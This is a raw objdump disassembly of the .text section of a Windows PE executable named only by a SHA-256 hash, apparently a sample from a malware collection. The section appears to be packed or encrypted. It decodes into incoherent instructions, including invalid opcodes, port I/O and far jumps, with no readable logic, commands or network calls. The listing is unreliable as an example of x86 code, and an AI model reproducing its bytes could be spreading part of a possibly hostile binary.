
14958ce3b73232c0354597833747c064e067c0ff3b60d430d292d7623cbf5b5e.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	mul    BYTE PTR [esi+0x2591feba]
  411006:	sub    BYTE PTR [ebx+0x52],dh
  411009:	sbb    al,0xcd
  41100b:	xor    al,0xbd
  41100d:	outs   dx,BYTE PTR ds:[esi]
  41100e:	les    edx,FWORD PTR [ecx+0x6a]
  411011:	jle    0x411036
  411013:	push   cs
  411014:	push   ecx
  411015:	xchg   ecx,eax
  411016:	adc    eax,0x5c7e18aa
  41101b:	mov    cl,BYTE PTR [ebx-0x198bd092]
  411021:	mov    ds:0x2fbe9104,al
  411026:	test   al,0x10
  411028:	(bad)  
  41102a:	in     al,0xfd
  41102c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41102d:	push   eax
  41102e:	test   al,0x61
  411030:	xor    BYTE PTR [ecx],0xaa
  411033:	push   cs
  411034:	push   ebx
  411035:	cmp    DWORD PTR [ebx],edx
  411037:	aam    0xd7
  411039:	cwde   
  41103a:	xchg   esp,eax
  41103b:	cmp    al,0xcf
  41103d:	mov    bl,bl
  41103f:	rcr    DWORD PTR [esi-0x315635a1],cl
  411045:	jg     0x410fcf
  411047:	adc    al,0xa7
  411049:	hlt    
  41104a:	aam    0x27
  41104c:	loop   0x410fd8
  41104e:	bound  esi,QWORD PTR [esi+eax*8+0x3d90bf63]
  411055:	mov    ah,0xb3
  411057:	xchg   DWORD PTR [ebx+0x43d1dcef],edx
  41105d:	jmp    0x410ffd
  41105f:	cmp    eax,ebx
  411061:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411062:	pop    esp
  411063:	dec    eax
  411064:	sbb    dl,BYTE PTR [ebp+0x20]
  411067:	inc    ecx
  411068:	xchg   edi,eax
  411069:	jnp    0x4110c9
  41106b:	sbb    al,0xc8
  41106d:	pop    ebx
  41106e:	pop    edx
  41106f:	shl    BYTE PTR [eax],cl
  411071:	jle    0x4110b7
  411073:	in     al,0x5a
  411075:	xor    al,0x22
  411077:	jmp    0xa6485923
  41107c:	sub    BYTE PTR [ebx],bl
  41107e:	mov    eax,0x591ee9b6
  411083:	pop    edx
  411084:	cmp    eax,0xb2d9f3ab
  411089:	push   eax
  41108a:	call   0xab63:0x25dbdfef
  411091:	stc    
  411092:	(bad)  
  411093:	or     eax,0x3a94ecc1
  411098:	add    BYTE PTR [ecx+0x4],cl
  41109b:	adc    bh,BYTE PTR [ebp-0x3f4a11ad]
  4110a1:	cmp    al,BYTE PTR [ecx-0x2569eeeb]
  4110a7:	dec    eax
  4110a8:	ins    BYTE PTR es:[edi],dx
  4110a9:	les    ebp,FWORD PTR [ecx-0x1f]
  4110ac:	inc    DWORD PTR [ecx]
  4110ae:	lods   al,BYTE PTR ds:[esi]
  4110af:	cmp    BYTE PTR [ecx+0x31],bl
  4110b2:	cmp    ebp,ecx
  4110b4:	inc    ecx
  4110b5:	dec    ebx
  4110b6:	and    al,ch
  4110b8:	pop    edx
  4110b9:	mov    edi,0x26e1741f
  4110be:	push   0xffffff9e
  4110c0:	out    dx,eax
  4110c1:	loop   0x41110b
  4110c3:	fnsave [edi]
  4110c5:	addr16 pusha 
  4110c7:	mov    eax,ds:0x721076b4
  4110cc:	das    
  4110cd:	cmp    eax,ecx
  4110cf:	mov    ch,0xff
  4110d1:	sub    ah,BYTE PTR [esi+0x6d]
  4110d4:	push   es
  4110d5:	sti    
  4110d6:	cmp    DWORD PTR [edx+0x27],edx
  4110d9:	or     bl,al
  4110db:	xchg   esp,eax
  4110dc:	stc    
  4110dd:	xchg   edx,eax
  4110de:	and    bh,BYTE PTR cs:[ebx]
  4110e1:	xor    BYTE PTR [ecx+0x73],cl
  4110e4:	es test al,0x66
  4110e7:	aaa    
  4110e8:	cmp    DWORD PTR [ecx+0xe],0xffffff87
  4110ec:	lea    ebx,[edi]
  4110ee:	je     0x41107e
  4110f0:	sti    
  4110f1:	sbb    BYTE PTR ss:0x5165f388,ah
  4110f8:	cmp    ecx,DWORD PTR [edx+ecx*4]
  4110fb:	loopne 0x4110dd
  4110fd:	and    al,0x86
  4110ff:	mov    ecx,0xae7201d5
  411104:	(bad)  
  411106:	mov    edi,DWORD PTR [ebx+ecx*4+0x5e8ed1bf]
  41110d:	mov    ds:0x247b2a47,eax
  411112:	push   ss
  411113:	mov    esp,0x957cb7c
  411118:	sbb    DWORD PTR [ebx],ebp
  41111a:	mov    bl,BYTE PTR [ecx+eiz*1+0x6fb3560a]
  411121:	pop    es
  411122:	scas   eax,DWORD PTR es:[edi]
  411123:	pushf  
  411124:	xor    al,0x79
  411126:	push   edi
  411127:	sub    DWORD PTR [ebp-0x1d],edx
  41112a:	adc    ch,BYTE PTR [edx+0x5c]
  41112d:	stos   BYTE PTR es:[edi],al
  41112e:	lea    ebp,[ecx-0x1e3f03b]
  411134:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411135:	xor    BYTE PTR [esi-0x48cc36c2],0x2d
  41113c:	mov    ebx,0x68d3587e
  411141:	or     ch,cl
  411143:	fisubr DWORD PTR [ebx-0x71]
  411146:	and    BYTE PTR [ecx-0x734dc7a3],ch
  41114c:	jl     0x4111cb
  41114e:	fucomi st,st(0)
  411150:	cmp    eax,0x963c2375
  411155:	pushf  
  411156:	mov    WORD PTR [ebx-0x7f],es
  411159:	adc    cl,BYTE PTR [ebp-0x18019861]
  41115f:	push   esp
  411160:	in     eax,dx
  411161:	(bad)  
  411162:	fisubr WORD PTR [edx]
  411164:	push   eax
  411165:	sub    eax,0x3cedb2f2
  41116a:	sub    al,0x1e
  41116c:	xchg   DWORD PTR [edx],ebp
  41116e:	lahf   
  41116f:	scas   al,BYTE PTR es:[edi]
  411170:	inc    edx
  411171:	cmp    al,0x4f
  411173:	xor    dl,BYTE PTR [edi-0x5f]
  411176:	inc    edx
  411177:	mov    ebx,0x6b03a45
  41117c:	cld    
  41117d:	xor    cl,BYTE PTR [ebx+0x47]
  411180:	fcom   QWORD PTR [ecx]
  411182:	or     al,0x6a
  411184:	adc    DWORD PTR [ebx],0x1
  411187:	ss ret 0xbdc7
  41118b:	sbb    BYTE PTR [ecx-0x6e],bl
  41118e:	jle    0x41116a
  411190:	stos   BYTE PTR es:[edi],al
  411191:	imul   ebp,DWORD PTR [edx-0x27],0x5
  411195:	in     al,0x33
  411197:	call   0x611f:0x17350dd7
  41119e:	mov    ecx,0xac157f3f
  4111a3:	out    0xd8,al
  4111a5:	data16 add al,0xe2
  4111a8:	xor    DWORD PTR [edx+0x8],0xffffffd5
  4111ac:	inc    eax
  4111ad:	mov    eax,0x7c4ecb12
  4111b2:	arpl   bx,dx
  4111b4:	xlat   BYTE PTR ds:[ebx]
  4111b5:	pop    esi
  4111b6:	sti    
  4111b7:	or     al,0x8b
  4111b9:	fs in  al,dx
  4111bb:	pop    ecx
  4111bc:	push   ss
  4111bd:	int    0x57
  4111bf:	xor    esi,edx
  4111c1:	adc    al,0xfe
  4111c3:	(bad)  
  4111c4:	sub    edx,DWORD PTR [esi]
  4111c6:	mov    al,0x1
  4111c8:	stos   BYTE PTR es:[edi],al
  4111c9:	xchg   esi,eax
  4111ca:	sbb    BYTE PTR [edi],al
  4111cc:	dec    ebp
  4111cd:	push   es
  4111ce:	cld    
  4111cf:	xchg   edx,eax
  4111d0:	push   ds
  4111d1:	xor    bh,BYTE PTR [esi+0x2cfaa594]
  4111d7:	jge    0x41116c
  4111d9:	in     eax,0x74
  4111db:	jmp    0x9639:0xe2c107c5
  4111e2:	sbb    BYTE PTR [edi],dl
  4111e4:	or     DWORD PTR [edi-0x4c],eax
  4111e7:	nop
  4111e8:	push   es
  4111e9:	out    dx,eax
  4111ea:	mov    DWORD PTR [edx],ebp
  4111ec:	dec    edi
  4111ed:	fiadd  DWORD PTR [ecx+0xcd00748]
  4111f3:	lea    edx,[eax-0x2]
  4111f6:	mov    ah,0x1b
  4111f8:	dec    esi
  4111f9:	cmp    eax,0x54b76490
  4111fe:	bound  ebp,QWORD PTR [ebx-0x1c74a1b4]
  411204:	and    edi,DWORD PTR [eax-0x75d624cc]
  41120a:	sahf   
  41120b:	pop    edx
  41120c:	lock dec eax
  41120e:	adc    DWORD PTR [ebx-0x2],edi
  411211:	inc    edx
  411212:	mov    edi,DWORD PTR [edi]
  411214:	dec    esp
  411215:	in     al,0x64
  411217:	lods   eax,DWORD PTR ds:[esi]
  411218:	dec    ecx
  411219:	ficomp DWORD PTR [ecx]
  41121b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41121c:	xchg   esi,eax
  41121d:	jp     0x411215
  41121f:	xchg   DWORD PTR [ebx-0x6],esi
  411222:	inc    esi
  411223:	inc    ebp
  411224:	scas   al,BYTE PTR es:[edi]
  411225:	mov    cl,0xb7
  411227:	out    0x19,al
  411229:	ffree  st(2)
  41122b:	sahf   
  41122c:	es adc al,0x51
  41122f:	dec    eax
  411230:	or     al,0xd9
  411232:	sar    BYTE PTR [esi],1
  411234:	mov    al,0xc9
  411236:	inc    ebp
  411237:	pop    edx
  411238:	shl    BYTE PTR [ebp+0x3b],1
  41123b:	xchg   DWORD PTR [ebp-0x1e],esp
  41123e:	sub    eax,0xa97b1d5a
  411243:	push   es
  411244:	mov    edi,0x80d46948
  411249:	das    
  41124a:	hlt    
  41124b:	push   es
  41124c:	scas   al,BYTE PTR es:[edi]
  41124d:	sbb    eax,0x3fa9365c
  411252:	and    BYTE PTR [ecx-0x2a60f231],bl
  411258:	mov    ah,0xfb
  41125a:	pop    esp
  41125b:	jae    0x411228
  41125d:	test   ebp,esp
  41125f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411260:	cld    
  411261:	dec    esi
  411262:	dec    esp
  411263:	in     eax,0x29
  411265:	retf   0xd558
  411268:	push   es
  411269:	mov    DWORD PTR [ebx-0x52],eax
  41126c:	mov    esp,0x3da28621
  411271:	mov    cl,0x18
  411273:	out    0x19,eax
  411275:	xor    DWORD PTR ds:0xc76e5f9,ecx
  41127b:	ins    DWORD PTR es:[edi],dx
  41127c:	add    ah,bh
  41127e:	push   ebx
  41127f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411280:	shl    BYTE PTR [eax],0xab
  411283:	xor    eax,0xcef36db5
  411288:	shl    al,1
  41128a:	mov    edi,DWORD PTR [edx]
  41128c:	icebp  
  41128d:	mov    edx,0xb5b9cbb2
  411292:	jo     0x4112bf
  411294:	jp     0x411246
  411296:	sbb    bh,BYTE PTR [edi]
  411298:	out    0x2f,al
  41129a:	xchg   edi,eax
  41129b:	dec    ebx
  41129c:	pop    ecx
  41129d:	lods   al,BYTE PTR ds:[esi]
  41129e:	das    
  41129f:	sbb    eax,0xe5408284
  4112a4:	fadd   DWORD PTR [eax+0x2307f82e]
  4112aa:	jmp    0x42c6726b
  4112af:	jp     0x411241
  4112b1:	mov    edi,0xf510be3f
  4112b6:	jle    0x411256
  4112b8:	addr16 push 0xca400f80
  4112be:	shl    DWORD PTR [ebx],cl
  4112c0:	les    ebp,FWORD PTR [ecx-0x21]
  4112c3:	pop    edx
  4112c4:	push   eax
  4112c5:	mov    dh,0x43
  4112c7:	mov    WORD PTR ds:0x8c4c66e7,gs
  4112cd:	mov    eax,ds:0x92898df0
  4112d2:	in     eax,dx
  4112d3:	pushf  
  4112d4:	pop    eax
  4112d5:	(bad)  
  4112d6:	pop    ebx
  4112d7:	loop   0x411309
  4112d9:	pushf  
  4112da:	retf   0x4678
  4112dd:	sahf   
  4112de:	std    
  4112df:	cmp    DWORD PTR [eax+0x40],ebp
  4112e2:	in     al,0x61
  4112e4:	lods   al,BYTE PTR ds:[esi]
  4112e5:	jmp    0xa355c32d
  4112ea:	mov    al,0x4c
  4112ec:	fs jle 0x4112b4
  4112ef:	or     eax,0xee32d2d1
  4112f4:	rcl    DWORD PTR [edi+0x6a],1
  4112f7:	sub    ah,BYTE PTR [esi+0x5c3e097a]
  4112fd:	or     ah,BYTE PTR [edi]
  4112ff:	adc    BYTE PTR [ecx],al
  411301:	sbb    ecx,0xf0b1c1d5
  411307:	jp     0x4112b2
  411309:	mov    esp,0xc997acdc
  41130e:	mov    BYTE PTR [edx],ah
  411310:	test   BYTE PTR [ebx-0x5caf94b7],bh
  411316:	pop    esp
  411317:	xlat   BYTE PTR ds:[ebx]
  411318:	sub    DWORD PTR [edi+ecx*4],ecx
  41131b:	push   edx
  41131c:	lods   eax,DWORD PTR ds:[esi]
  41131d:	jl     0x411399
  41131f:	push   esp
  411320:	stos   DWORD PTR es:[edi],eax
  411321:	sub    BYTE PTR [esi],al
  411323:	fadd   DWORD PTR [esi-0x2a]
  411326:	sar    esi,cl
  411328:	jnp    0x411338
  41132a:	js     0x411359
  41132c:	xor    ebp,DWORD PTR [edi+edx*2-0x734b0e8a]
  411333:	daa    
  411334:	mov    ds:0xdb7a4130,eax
  411339:	jmp    0x92a:0xc797f61e
  411340:	das    
  411341:	arpl   WORD PTR [ecx+0x79],sp
  411344:	mov    edi,DWORD PTR [esi*2-0x2e6a57e4]
  41134b:	(bad)  
  41134c:	repz mov ebx,0x759f320b
  411352:	xor    ah,ah
  411354:	lods   al,BYTE PTR ds:[esi]
  411355:	loop   0x4113b1
  411357:	pop    ebp
  411358:	sub    ah,BYTE PTR ds:0xc2e9cb0c
  41135e:	cmp    al,BYTE PTR [ebp+edi*8-0x44]
  411362:	test   al,0x78
  411364:	fist   DWORD PTR [ebx+esi*2-0x6a26a980]
  41136b:	mov    bh,0x5
  41136d:	xchg   ebx,ebp
  41136f:	mov    al,0x7d
  411371:	pop    edx
  411372:	sub    DWORD PTR [eax],ebx
  411374:	mov    edx,0xf537246c
  411379:	xchg   edx,eax
  41137a:	jp     0x411373
  41137c:	adc    al,0x8c
  41137e:	nop
  41137f:	int    0x53
  411381:	lahf   
  411382:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411383:	xor    eax,0x47597a76
  411388:	xchg   ebx,eax
  411389:	xor    BYTE PTR [ecx+0xd],bl
  41138c:	call   FWORD PTR [ebx+ecx*2+0x698c91f6]
  411393:	leave  
  411394:	pop    ecx
  411395:	sti    
  411396:	push   0x3f
  411398:	lods   eax,DWORD PTR ds:[esi]
  411399:	adc    esi,DWORD PTR [eax+ebp*8]
  41139c:	iret   
  41139d:	xchg   edi,eax
  41139e:	push   0x6d600953
  4113a3:	mov    al,0xb8
  4113a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113a6:	(bad)
  4113a9:	and    BYTE PTR [edx],ch
  4113ab:	xor    ecx,DWORD PTR [ecx]
  4113ad:	sub    al,0x4
  4113af:	inc    ebp
  4113b0:	pop    edi
  4113b1:	dec    ecx
  4113b2:	sbb    DWORD PTR [ebp+0x7bc43643],0x3fb0a9b5
  4113bc:	mov    dl,0x94
  4113be:	add    eax,0x4baea9a8
  4113c3:	dec    eax
  4113c4:	mov    ecx,0x52152258
  4113c9:	pop    edx
  4113ca:	stc    
  4113cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113cc:	cmp    DWORD PTR [eax],ebx
  4113ce:	jg     0x411431
  4113d0:	jbe    0x411423
  4113d2:	adc    al,0xee
  4113d4:	jle    0x4113c2
  4113d6:	cwde   
  4113d7:	or     bh,BYTE PTR [edi-0x22c9b075]
  4113dd:	test   DWORD PTR [ecx+0x39],eax
  4113e0:	xchg   edx,eax
  4113e1:	xor    ah,0x40
  4113e4:	sub    dh,dl
  4113e6:	jb     0x411394
  4113e8:	push   ss
  4113e9:	rol    DWORD PTR [edx],cl
  4113eb:	fcomp  QWORD PTR [ebx+0x4c]
  4113ee:	jbe    0x411427
  4113f0:	jg     0x411416
  4113f2:	inc    esp
  4113f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113f4:	mov    eax,0xa1d8fc3d
  4113f9:	cmp    DWORD PTR [ebp-0x53931692],esp
  4113ff:	pop    ds
  411400:	jl     0x4113c6
  411402:	sar    DWORD PTR [ecx+edi*4],1
  411405:	movq   QWORD PTR [ebp-0x54],mm7
  411409:	adc    esi,edi
  41140b:	pop    ds
  41140c:	addr16 aad 0xc
  41140f:	xor    al,0xb4
  411411:	mov    ch,0x7f
  411413:	add    al,0xaa
  411415:	repnz retf 
  411417:	mov    al,ds:0x4d3a7321
  41141c:	cmp    al,0x70
  41141e:	inc    ebp
  41141f:	outs   dx,BYTE PTR ds:[esi]
  411420:	xchg   ebx,eax
  411421:	nop
  411422:	shl    BYTE PTR [edi+0x3c8e96e2],1
  411428:	je     0x4113b6
  41142a:	push   0xffffffb4
  41142c:	inc    edx
  41142d:	sbb    BYTE PTR [ebp+0x5b1fdc4c],al
  411433:	shl    DWORD PTR [ecx+0x4b],1
  411436:	jb     0x411430
  411438:	sbb    cl,BYTE PTR [edi]
  41143a:	jp     0x411403
  41143c:	push   ecx
  41143d:	je     0x4114a8
  41143f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411440:	jae    0x41144f
  411442:	imul   esp,DWORD PTR [esi-0x7b3b1972],0xcd1d2b56
  41144c:	inc    esp
  41144d:	fwait
  41144e:	shr    edx,1
  411450:	jo     0x576af7ca
  411456:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411457:	cmp    bl,BYTE PTR [ebp-0x1a40bfd2]
  41145d:	sub    al,0x8d
  41145f:	mov    dh,ch
  411461:	or     BYTE PTR fs:[eax+0x52733cb5],ah
  411468:	mov    esi,0x8337a961
  41146d:	jg     0x4114c5
  41146f:	push   ebx
  411470:	fmulp  st(3),st
  411472:	rcl    BYTE PTR [edx+edi*2],1
  411475:	push   esi
  411476:	aam    0xd2
  411478:	arpl   di,ax
  41147a:	outs   dx,DWORD PTR ds:[esi]
  41147b:	pop    ebx
  41147c:	and    BYTE PTR [esi+0x3f],bh
  41147f:	fwait
  411480:	dec    ebx
  411481:	lods   al,BYTE PTR ds:[esi]
  411482:	jnp    0x41145e
  411484:	aas    
  411485:	add    ch,cl
  411487:	stc    
  411488:	lods   eax,DWORD PTR ds:[esi]
  411489:	mov    ecx,esp
  41148b:	inc    bl
  41148d:	es in  eax,0x46
  411490:	and    edx,edx
  411492:	dec    ebx
  411493:	stos   DWORD PTR es:[edi],eax
  411494:	iret   
  411495:	rcl    BYTE PTR [ecx],0x72
  411498:	push   ebp
  411499:	not    BYTE PTR [ebp-0x25]
  41149c:	bound  eax,QWORD PTR [esi+edx*8+0x53]
  4114a0:	sti    
  4114a1:	lods   eax,DWORD PTR ds:[esi]
  4114a2:	cld    
  4114a3:	mov    al,0x98
  4114a5:	xchg   edi,eax
  4114a6:	in     al,dx
  4114a7:	cmp    dh,bh
  4114a9:	fistp  QWORD PTR [ecx+0x7]
  4114ac:	(bad)  
  4114ae:	call   0x8916c7f9
  4114b3:	cmp    DWORD PTR [edx-0x31cb7ba5],esi
  4114b9:	mov    eax,0x7375577a
  4114be:	(bad)  
  4114bf:	adc    cl,ch
  4114c1:	addr16 cmp bh,al
  4114c4:	jae    0x411465
  4114c6:	fnstsw WORD PTR [ecx+eax*8-0x60]
  4114ca:	enter  0x3090,0x4
  4114ce:	inc    edi
  4114cf:	js     0x99048dce
  4114d5:	cwde   
  4114d6:	shl    DWORD PTR [edi],1
  4114d8:	stos   DWORD PTR es:[di],eax
  4114da:	adc    ecx,DWORD PTR [ecx-0x3762545e]
  4114e0:	test   DWORD PTR [ebx-0x5c],ecx
  4114e3:	and    DWORD PTR [ebx-0x1105576c],eax
  4114e9:	sub    ebp,ecx
  4114eb:	daa    
  4114ec:	scas   al,BYTE PTR es:[edi]
  4114ed:	add    DWORD PTR [edi-0x73db00a5],esi
  4114f3:	xchg   edx,eax
  4114f4:	push   edx
  4114f5:	inc    ecx
  4114f6:	test   al,0x62
  4114f8:	push   0xffffffff
  4114fa:	les    esp,FWORD PTR [edx-0x57d6f4b2]
  411500:	or     al,0xb9
  411502:	leave  
  411503:	jl     0x41151d
  411505:	fnstenv [ebp-0x743eef63]
  41150b:	and    ch,al
  41150d:	das    
  41150e:	push   cs
  41150f:	mov    al,ds:0x4f34e8b7
  411514:	scas   eax,DWORD PTR es:[edi]
  411515:	fadd   QWORD PTR [edx]
  411517:	mul    BYTE PTR [esi]
  411519:	xchg   esi,eax
  41151a:	mov    al,0x41
  41151c:	mov    edi,0xc7706c4
  411521:	cmp    BYTE PTR [edi+0x47],0xf1
  411525:	jbe    0x411557
  411527:	push   ebx
  411528:	test   DWORD PTR [edi-0x1bcb29ce],ecx
  41152e:	sbb    cl,bl
  411530:	sbb    bh,BYTE PTR [edx+edx*4+0x14]
  411534:	aas    
  411535:	mov    edi,ss
  411537:	pop    ebp
  411538:	and    bh,bh
  41153a:	sub    DWORD PTR [esi-0x47],ecx
  41153d:	push   edx
  41153e:	jne    0x411571
  411540:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411541:	cwde   
  411542:	xor    BYTE PTR [edx+0x1f57d1f0],bh
  411548:	xchg   ebp,eax
  411549:	clc    
  41154a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41154b:	mov    ebp,0xa53756fa
  411550:	loop   0x411562
  411552:	(bad)  
  411553:	fsub   QWORD PTR [ecx+0x62]
  411556:	mov    dl,0x66
  411558:	iret   
  411559:	xchg   DWORD PTR [eax+0xdf6042],esi
  41155f:	bound  esi,QWORD PTR [ebp+0x61]
  411562:	mov    ds:0xe21bdec1,eax
  411567:	outs   dx,DWORD PTR ds:[esi]
  411568:	mov    bl,0x1
  41156a:	adc    ebp,DWORD PTR [esi-0x5b43ae12]
  411570:	xlat   BYTE PTR ds:[ebx]
  411571:	sbb    al,0xcc
  411573:	ds dec edx
  411575:	jle    0x411583
  411577:	and    dh,BYTE PTR [esp+ebx*1+0x581fd743]
  41157e:	into   
  41157f:	jg     0x411525
  411581:	pop    ss
  411582:	push   0x7e
  411584:	inc    eax
  411585:	adc    DWORD PTR [edi],edi
  411587:	jne    0x411574
  411589:	jnp    0x4115ec
  41158b:	fld    DWORD PTR [eax]
  41158d:	push   esp
  41158e:	cwde   
  41158f:	iret   
  411590:	lea    esp,[edx+0x22e82e52]
  411596:	inc    esp
  411597:	jg     0x4115a8
  411599:	adc    eax,0xb05d168c
  41159e:	rcl    BYTE PTR [eax],0x95
  4115a1:	and    dl,BYTE PTR [ebp+0x74]
  4115a4:	repnz (bad) 
  4115a6:	or     ebp,DWORD PTR ds:0x7b4f8621
  4115ac:	xchg   ebp,eax
  4115ad:	(bad)  
  4115ae:	stc    
  4115af:	add    edx,DWORD PTR [edi+0x47b7abfa]
  4115b5:	int3   
  4115b6:	mov    edi,0xb6085076
  4115bb:	push   edx
  4115bc:	cmp    DWORD PTR cs:[ebx+0x66],eax
  4115c0:	test   al,0xd6
  4115c2:	jo     0x4115c9
  4115c4:	stos   DWORD PTR es:[edi],eax
  4115c5:	ror    BYTE PTR [ebx+0x22],1
  4115c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115c9:	in     eax,0x85
  4115cb:	pop    es
  4115cc:	jns    0x411559
  4115ce:	adc    cl,BYTE PTR [edi]
  4115d0:	lahf   
  4115d1:	jmp    0x41163a
  4115d3:	mov    dl,al
  4115d5:	std    
  4115d6:	lods   al,BYTE PTR ds:[esi]
  4115d7:	hlt    
  4115d8:	lods   eax,DWORD PTR ds:[esi]
  4115d9:	out    0xc2,eax
  4115db:	aad    0x77
  4115dd:	scas   eax,DWORD PTR es:[edi]
  4115de:	mov    al,ds:0x3fff297e
  4115e3:	jmp    0x4115b6
  4115e5:	jge    0x411608
  4115e7:	adc    DWORD PTR [ebx+0x13],ecx
  4115ea:	push   edx
  4115eb:	bnd jge 0x4115c4
  4115ee:	xchg   ebp,eax
  4115ef:	fstp   st(0)
  4115f1:	test   eax,0xfdd20b66
  4115f6:	out    0x97,eax
  4115f8:	std    
  4115f9:	in     al,0x2e
  4115fb:	fcom   DWORD PTR [ebx]
  4115fd:	sbb    DWORD PTR [esi+0x15],0x6f
  411601:	jl     0x411593
  411603:	out    0xe5,al
  411605:	cwde   
  411606:	fs xor ebx,esi
  411609:	jl     0x41159b
  41160b:	in     al,0x7f
  41160d:	es xor eax,0xb0167e9c
  411613:	stc    
  411614:	lods   al,BYTE PTR ds:[esi]
  411615:	fst    DWORD PTR [eax-0x37a0ffd4]
  41161b:	sahf   
  41161c:	mov    ecx,0x8f63b972
  411621:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411622:	mov    al,0x26
  411624:	sbb    DWORD PTR [eax],esp
  411626:	mov    edi,0x3bfdc214
  41162b:	or     BYTE PTR [edx-0x1acc9c2e],al
  411631:	push   esi
  411632:	inc    edx
  411633:	fbstp  TBYTE PTR [edx-0x2d]
  411636:	dec    ebp
  411637:	push   cs
  411638:	jae    0x411622
  41163a:	add    BYTE PTR [ecx],dl
  41163c:	mov    ds:0xfbc24030,al
  411641:	xor    BYTE PTR ds:0x13ca1793,dh
  411647:	jae    0x41169f
  411649:	(bad)
  41164c:	sbb    ch,ch
  41164e:	xchg   edi,eax
  41164f:	test   ebp,0x74ea8dc8
  411655:	mov    esi,ecx
  411657:	ds nop
  411659:	push   cs
  41165a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41165b:	bound  esp,QWORD PTR [esi+edi*1]
  41165e:	nop
  41165f:	xor    eax,0x6df8c1d8
  411664:	and    al,0xfb
  411666:	xor    cl,bl
  411668:	sbb    eax,0x5ab0323a
  41166d:	aad    0xfc
  41166f:	or     cl,BYTE PTR [edi]
  411671:	retf   0x5925
  411674:	adc    esi,0x25
  411677:	inc    DWORD PTR [edi-0x48]
  41167a:	sbb    BYTE PTR [ebx],0x59
  41167d:	fisub  WORD PTR [ecx-0x3e25a562]
  411683:	test   BYTE PTR [ecx],0x33
  411686:	and    eax,DWORD PTR [ecx+0x4e]
  411689:	jno    0x4116f0
  41168b:	jge    0x4116e8
  41168d:	dec    eax
  41168e:	sbb    edx,DWORD PTR [esi]
  411690:	dec    ebx
  411691:	outs   dx,DWORD PTR ds:[esi]
  411692:	and    cl,dh
  411694:	iret   
  411695:	or     esi,ebp
  411697:	push   esi
  411698:	pushf  
  411699:	jno    0x411707
  41169b:	jmp    0xadfe:0xcea5b018
  4116a2:	ror    BYTE PTR [eax],cl
  4116a4:	retf   
  4116a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116a6:	int    0xa6
  4116a8:	add    al,0x8c
  4116aa:	loop   0x411683
  4116ac:	daa    
  4116ad:	(bad)  
  4116ae:	int    0xd8
  4116b0:	imul   ebx,DWORD PTR [ebp-0x3f10097b],0xb91f50ad
  4116ba:	js     0x4116b4
  4116bc:	das    
  4116bd:	push   ss
  4116be:	or     eax,0xbe6058ea
  4116c3:	jp     0x411694
  4116c5:	in     eax,0x86
  4116c7:	inc    ecx
  4116c8:	cmp    bl,BYTE PTR [edx]
  4116ca:	jmp    0x3606:0x7274d81c
  4116d1:	daa    
  4116d2:	mov    edi,gs
  4116d4:	cmp    eax,0x897e8988
  4116d9:	adc    eax,0x5b22149c
  4116de:	(bad)  
  4116df:	imul   eax,DWORD PTR [esi-0x3e],0x6699e671
  4116e6:	lods   al,BYTE PTR ds:[esi]
  4116e7:	shl    DWORD PTR [eax],0x70
  4116ea:	and    esp,ecx
  4116ec:	outs   dx,BYTE PTR ds:[esi]
  4116ed:	xor    al,0xa9
  4116ef:	inc    ebp
  4116f0:	mov    DWORD PTR [edi-0x30b1d3dd],eax
  4116f6:	sbb    BYTE PTR [ebp+0x8],al
  4116f9:	pushf  
  4116fa:	lahf   
  4116fb:	push   eax
  4116fc:	adc    edi,DWORD PTR [ebp-0x2e959303]
  411702:	dec    eax
  411703:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411704:	xor    DWORD PTR [edi],esi
  411706:	xlat   BYTE PTR ds:[ebx]
  411707:	push   0xf9190ccf
  41170c:	mov    esp,0x989d746e
  411711:	int3   
  411712:	sbb    bl,BYTE PTR [esp+esi*2+0x2f501675]
  411719:	aam    0x59
  41171b:	mov    ah,0x2
  41171d:	fstp   TBYTE PTR [esi-0x3]
  411720:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411721:	into   
  411722:	sbb    ch,BYTE PTR [esi]
  411724:	iret   
  411725:	vcvtsi2ss xmm1,xmm4,DWORD PTR [edi]
  411729:	pop    ss
  41172a:	mov    ss,WORD PTR [eax+0x20d8a767]
  411730:	outs   dx,DWORD PTR ds:[esi]
  411731:	loop   0x41170c
  411733:	inc    ecx
  411734:	fld    DWORD PTR [eax+eax*1-0x20]
  411738:	ins    BYTE PTR es:[edi],dx
  411739:	add    eax,0x5d0dc31d
  41173e:	adc    al,0x99
  411740:	push   cs
  411741:	add    eax,0xa48c7627
  411746:	pop    es
  411747:	mov    ch,0x78
  411749:	jmp    0x1c8f:0x46f3a093
  411750:	repz cmp al,0xd4
  411753:	xchg   ecx,eax
  411754:	xor    DWORD PTR [ebp-0x3b],edx
  411757:	lods   al,BYTE PTR ds:[esi]
  411758:	imul   ecx,DWORD PTR [ebx+0x72c8336a],0xe
  41175f:	push   ebp
  411760:	ficomp WORD PTR [ebp-0x29]
  411763:	or     dh,BYTE PTR [ecx-0x3479ee53]
  411769:	adc    edi,DWORD PTR ds:0xa58c24b6
  41176f:	repnz cmp esp,DWORD PTR ss:[edx-0x5d]
  411774:	mov    dl,cl
  411776:	inc    ebp
  411777:	mov    WORD PTR [edx+esi*4+0x4c11a4e8],ds
  41177e:	jmp    0xe011:0x16d8c54c
  411785:	sbb    DWORD PTR [ecx-0xe],esp
  411788:	and    al,BYTE PTR [edi+0x4e]
